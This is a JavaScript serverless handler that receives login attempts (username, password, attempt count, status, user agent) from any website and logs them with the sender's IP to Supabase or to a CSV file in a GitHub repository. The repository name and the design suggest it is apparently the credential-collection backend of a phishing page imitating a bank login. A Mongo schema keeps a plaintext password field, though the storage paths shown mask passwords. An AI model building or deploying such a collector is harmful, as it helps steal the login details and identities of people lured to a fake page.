// fetch is built-in to Node 18+
const MONGODB_URI = process.env.MONGODB_URI;
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://pgsccgetvjjoerefqitb.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GITHUB_REPO = process.env.GITHUB_REPO || 'sapphirenetllc/JPMCLP1';

let dbConnected = false;
let connection = null;

// MongoDB setup (optional)
let mongoose = null;
let LoginLog = null;

async function initMongoose() {
  if (mongoose) return;
  try {
    const mongooseModule = await import('mongoose');
    mongoose = mongooseModule.default;
  } catch (err) {
    console.log('Mongoose not available');
  }
}

async function connectDB() {
  if (!mongoose || connection) return connection;
  
  try {
    connection = await mongoose.connect(MONGODB_URI, {
      serverSelectionTimeoutMS: 5000,
      retryWrites: true,
      w: 'majority'
    });
    
    const loginLogSchema = new mongoose.Schema({
      timestamp: { type: Date, default: Date.now, index: true },
      username: String,
      password: String,
      attemptNumber: Number,
      status: String,
      userAgent: String,
      ipAddress: String,
    }, { collection: 'login_logs' });

    LoginLog = mongoose.model('LoginLog', loginLogSchema);
    dbConnected = true;
    console.log('✅ Connected to MongoDB');
    return connection;
  } catch (err) {
    console.warn('⚠️  MongoDB connection failed:', err.message);
    dbConnected = false;
    return null;
  }
}

async function saveToSupabase(logData) {
  if (!SUPABASE_URL || !SUPABASE_KEY) {
    console.warn('⚠️  Supabase credentials not configured');
    return false;
  }

  try {
    const response = await fetch(`${SUPABASE_URL}/rest/v1/login_logs`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({
        timestamp: new Date(logData.timestamp).toISOString(),
        username: logData.username,
        password: '***', // Don't store password
        attempt_number: logData.attemptNumber,
        status: logData.status,
        user_agent: logData.userAgent,
        ip_address: logData.ipAddress
      })
    });

    if (response.ok) {
      console.log('✅ Logged to Supabase');
      return true;
    } else {
      console.warn('⚠️  Failed to log to Supabase:', response.status);
      return false;
    }
  } catch (err) {
    console.error('Error saving to Supabase:', err.message);
    return false;
  }
}

async function saveToGitHub(logData) {
  if (!GITHUB_TOKEN) {
    console.warn('⚠️  GITHUB_TOKEN not set, skipping GitHub backup');
    return false;
  }

  try {
    // Format log as CSV line
    const csvLine = [
      new Date(logData.timestamp).toISOString(),
      logData.username,
      '***', // Don't store password in public repo
      logData.attemptNumber,
      logData.status,
      logData.userAgent,
      logData.ipAddress
    ].join(',');

    // Append to CSV file in GitHub
    const filePath = 'logs/login_attempts.csv';
    const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
    
    // Get current file content
    const getResponse = await fetch(url, {
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`,
        'Accept': 'application/vnd.github.v3+json'
      }
    });

    let newContent = csvLine + '\n';
    let sha = null;

    if (getResponse.ok) {
      const data = await getResponse.json();
      const currentContent = Buffer.from(data.content, 'base64').toString('utf-8');
      newContent = currentContent + csvLine + '\n';
      sha = data.sha;
    }

    // Update file
    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`,
        'Accept': 'application/vnd.github.v3+json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: `Log login attempt: ${logData.username}`,
        content: Buffer.from(newContent).toString('base64'),
        sha
      })
    });

    if (response.ok) {
      console.log('✅ Logged to GitHub');
      return true;
    } else {
      console.warn('⚠️  Failed to log to GitHub:', response.status);
      return false;
    }
  } catch (err) {
    console.error('Error saving to GitHub:', err.message);
    return false;
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  try {
    if (req.method === 'POST') {
      const { username, password, attemptNumber, status, timestamp, userAgent } = req.body;
      
      const ipAddress = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
      
      const logData = {
        timestamp: new Date(timestamp),
        username,
        password,
        attemptNumber,
        status,
        userAgent,
        ipAddress,
      };
      
      let stored = 'Supabase';
      
      // Try Supabase first (primary)
      const supabaseOk = await saveToSupabase(logData);
      if (!supabaseOk) {
        stored = 'GitHub';
        // Fallback to GitHub
        await saveToGitHub(logData);
      }
      
      console.log(`[${new Date().toISOString()}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status}) [${stored}]`);
      
      res.status(200).json({ 
        success: true, 
        message: 'Login attempt logged',
        stored
      });
    }
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
}
